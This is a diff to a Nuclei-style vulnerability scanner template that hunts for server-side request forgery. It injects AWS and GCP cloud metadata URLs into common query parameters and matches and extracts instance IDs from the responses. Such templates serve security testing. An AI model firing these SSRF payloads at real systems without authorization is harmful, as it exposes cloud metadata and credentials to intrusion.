@@ -1,31 +1,35 @@
 id: THENAWABX_FOUND_SSRF
 info:
-  name: 🛸 Nawab-SSRF-Strict 🛸
+  name: 🛰️ Nawab-Confirmed-SSRF-Hunter 🛰️
   author: thenawabx
   severity: critical
 
 http:
   - method: GET
     path:
-      - "{{BaseURL}}"
-    payloads:
-      ssrf_targets:
-        - "http://169.254.169.254/latest/meta-data/instance-id"
-    fuzzing:
-      - part: query
-        type: replace
-        fuzz:
-          - "{{ssrf_targets}}"
+      - "{{BaseURL}}?url=http://169.254.169.254/latest/meta-data/instance-id"
+      - "{{BaseURL}}?dest=http://169.254.169.254/latest/meta-data/instance-id"
+      - "{{BaseURL}}?uri=http://169.254.169.254/computeMetadata/v1/instance/id"
+      - "{{BaseURL}}?path=http://metadata.google.internal/computeMetadata/v1/instance/id"
+
+    headers:
+      Metadata-Flavor: "Google"
+
+    stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
+
       - type: regex
         part: body
         regex:
-          - "i-[a-f0-9]{17}"
-          - "i-[a-f0-9]{8}"
+          - "i-[a-f0-9]{17}" # AWS Instance ID
+          - "i-[a-f0-9]{8}"  # AWS Old Instance ID
+          - "^[0-9]{15,25}$" # GCP Instance ID
+        condition: or
+
       - type: word
         part: body
         negative: true
@@ -33,3 +37,12 @@ http:
           - "Cloudflare"
           - "Just a moment"
           - "Access Denied"
+          - "Forbidden"
+          - "example.com"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "i-[a-f0-9]{17}"
+          - "[0-9]{15,}"
